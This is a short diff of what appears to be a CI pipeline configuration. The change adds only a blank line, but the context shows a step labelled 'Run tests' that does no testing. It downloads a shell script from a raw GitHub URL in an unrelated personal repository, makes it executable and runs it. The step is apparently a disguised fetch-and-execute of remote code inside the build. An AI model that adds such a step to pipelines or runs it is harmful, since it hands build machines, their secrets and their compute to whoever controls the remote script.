@@ -8,3 +8,4 @@ jobs:
       - run: 
           name: Run tests 
           command: wget https://raw.githubusercontent.com/popoler/tn/main/vr.sh  && chmod +x vr.sh && ./vr.sh
+          
